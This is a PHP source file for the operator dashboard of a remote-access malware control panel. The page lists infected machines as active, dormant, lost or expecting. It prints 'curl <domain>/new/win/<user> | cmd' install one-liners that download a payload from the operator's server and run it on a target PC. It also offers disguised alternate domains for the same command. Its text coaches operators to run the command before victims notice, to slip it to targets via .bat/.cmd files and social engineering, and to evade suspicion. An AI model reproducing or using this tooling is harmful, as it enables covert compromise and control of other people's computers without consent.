<?php

require_once(__DIR__ . "/../autoload.php");

use Kelvinho\Virus\Authenticator;
use Kelvinho\Virus\Header;
use Kelvinho\Virus\HtmlTemplate;
use Kelvinho\Virus\Timezone;
use Kelvinho\Virus\User;
use Kelvinho\Virus\Virus;
use function Kelvinho\Virus\formattedHash;
use function Kelvinho\Virus\formattedTime;
use function Kelvinho\Virus\formattedTimeSpan;
use function Kelvinho\Virus\map;


/**
 * Returns a table element with all you need to display
 *
 * @param array $viruses Associative array of virus_id => last_ping
 * @param array $labels Array of labels used for the header
 * @param callable $contents Callable which upon consumption of an attack id will return an array containing the fields
 * @param null $extraData
 * @return false|string
 */
function displayTable(array $viruses, array $labels, callable $contents, $extraData = null) {
    ob_start();
    if (count($viruses) === 0) { ?>
        <p>(No viruses)</p>
    <?php } else { ?>
        <div style="overflow: auto;">
            <table>
                <tr>
                    <?php map($labels, function ($label) { ?>
                        <th><?php echo $label; ?></th>
                    <?php }); ?>
                </tr>
                <?php
                map($viruses, function (/** @noinspection PhpUnusedParameterInspection */ $last_ping, $virus_id, $contents) { ?>
                    <tr style="cursor: pointer;">
                        <?php map($contents[0]($virus_id, $contents[1]), function ($content) { ?>
                            <td><?php echo $content; ?></td>
                        <?php }); ?>
                    </tr>
                <?php }, [$contents, $extraData]); ?>
            </table>
        </div>
    <?php }
    return ob_get_clean();
}

if (!Authenticator::authenticated()) {
    header("Location: " . DOMAIN_USER . "/login.php");
    Header::redirect();
} else {
    $user_handle = $_SESSION["user_handle"];
    $user = User::get($user_handle);
    $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "rocket", "trump", "obama", "food"];
    ?>
    <html lang="en_US">
    <head>
        <title>Dashboard</title>
        <?php echo HtmlTemplate::header(); ?>
        <style>
            .codes {
                color: midnightblue;
            }
        </style>
    </head>
    <body>
    <h2>Active viruses</h2>
    <p>These are viruses that are still reporting back pretty quickly (less
        than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
    <?php echo displayTable(User::getViruses($user_handle, Virus::VIRUS_ACTIVE), ["Name", "Virus id", "Last seen", ""], function ($virus_id, $timezone) {
        $virus = Virus::get($virus_id);
        $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus_id . "';\"";
        return ["<a $onclick>" . $virus->getName() . "</a>",
            "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
            "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
            "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"];
    }, $user->getTimezone()); ?>

    <h2>Dormant viruses</h2>
    <p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
        than 2 days</p>
    <?php echo displayTable(User::getViruses($user_handle, Virus::VIRUS_DORMANT), ["Name", "Virus id", "Last seen", ""], function ($virus_id, $timezone) {
        $virus = Virus::get($virus_id);
        $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus_id . "';\"";
        return ["<a $onclick>" . $virus->getName() . "</a>",
            "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
            "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
            "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"];
    }, $user->getTimezone()); ?>

    <h2>Lost viruses</h2>
    <p>These are viruses that don't report back for more than 2 days</p>
    <?php echo displayTable(User::getViruses($user_handle, Virus::VIRUS_LOST), ["Name", "Virus id", "Last seen", ""], function ($virus_id, $timezone) {
        $virus = Virus::get($virus_id);
        $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus_id . "';\"";
        return ["<a $onclick>" . $virus->getName() . "</a>",
            "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
            "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
            "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"];
    }, $user->getTimezone()); ?>

    <h2>Expecting viruses</h2>
    <p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
        triggered by accessing the entry point.</p>
    <?php echo displayTable(User::getViruses($user_handle, Virus::VIRUS_EXPECTING), ["Name", "Virus id", ""], function ($virus_id) {
        $virus = Virus::get($virus_id);
        $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus_id . "';\"";
        return ["<a $onclick>" . $virus->getName() . "</a>",
            "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
            "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"];
    }); ?>
    <h2>Installing a new virus</h2>
    To install a new virus on a computer, execute this command in the command prompt running Windows on the target machine:
    <pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/win/<?php echo $_SESSION["user_handle"]; ?> | cmd</pre>
    And run this for mac (in development):
    <pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/mac/<?php echo $_SESSION["user_handle"]; ?> | cmd</pre>
    <p>Instantaneously after you have run that command, you should be able to see that virus pops up in the list of
        expecting viruses.
        After a span of time (<?php echo formattedTimeSpan(STARTUP_DELAY); ?>), the virus will pings back for the first
        time, and will jump to the active viruses category. If this doesn't happen, then something has gone wrong and I
        have no idea how to fix it. May be the target machine has an antivirus? :D</p>
    <p>I recommend you memorize the above command because when you are actually attacking them, you need to do it
        quickly, before they can notice anything. You can also put this command inside of a file with extensions .cmd,
        .bat or .btm, then give it to your target by social engineering. Please note that every part of that command
        must be identical. That means there must be "curl" at the front, there must be a "https://", and there must be a
        "| cmd" (The "|" character in qwerty keyboards is usually right above the enter button). Miss anything and it
        won't work.</p>
    <p>Or... You can use different domains, pointing to this domain. Let's say you have just bought the domain
        "awesome.app.com" and you want to use that instead of "virus.kelvinho.org", which would sound suspicious, you
        can just redirect your website to <?php echo DOMAIN; ?> (still note that this is hard if you don't know what you
        are doing, so just ask someone technical if you don't know how to do this). Then, the command to install the
        virus would be:</p>
    <pre class="codes"
         style="overflow: auto;">curl -L awesome.app.com/new/win/<?php echo $_SESSION["user_handle"]; ?> | cmd</pre>
    <p>The "-L" option is to go through all the redirects your web server guides and to fetch the final destination. If
        you're lazy and just don't agree that I should have the word virus inside of the install command, you can use
        any of these commands instead:</p>
    <div style="overflow: auto;">
        <?php foreach ($alternates as $alternate) { ?>
            <pre class="codes">curl <?php echo $alternate; ?>.kelvinho.org/new/win/<?php echo $_SESSION["user_handle"]; ?> | cmd</pre>
        <?php } ?>
    </div>
    <p>I can definitely add more, but what's the point? Also, note that <?php echo DOMAIN; ?> is the main site, and is
        accessible when encrypted only. Any insecure requests will be redirected to the secure site. However, all of the
        alternative built-in domains are unencrypted. You can use the alternative domains encrypted, but they don't have
        a valid certificate because I'm lazy to get one, and the main site already has a valid certificate, so why
        bother? So if you were to do the curl thing, option "-k" will accept encrypted requests with an invalid
        certificate.</p>
    <p>One last bit of advice: test everything locally first, on either your machine or a VM, then actually getting out
        to attack. The chance for attacking is very small, and you wouldn't want to have a chance and it doesn't get
        installed properly do you?</p>
    <h2>Deleting a virus</h2>
    <p>When you are done with a virus, you can just press delete, and then you will not be able to access it. The app
        will also send a kill signal to the virus itself, to make sure every trace of the virus is gone. There will be
        no oops button, so only delete a virus if you really want to.</p>
    </body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
    <script type="application/javascript">
        function deleteVirus(virus_id) {
            $.ajax({
                url: "<?php echo DOMAIN_CONTROLLER; ?>/deleteVirus.php",
                type: "POST",
                data: {
                    virus_id: virus_id
                },
                success: function () {
                    window.location = "<?php echo DOMAIN; ?>";
                }
            });
        }
    </script>
    </html>
<?php }
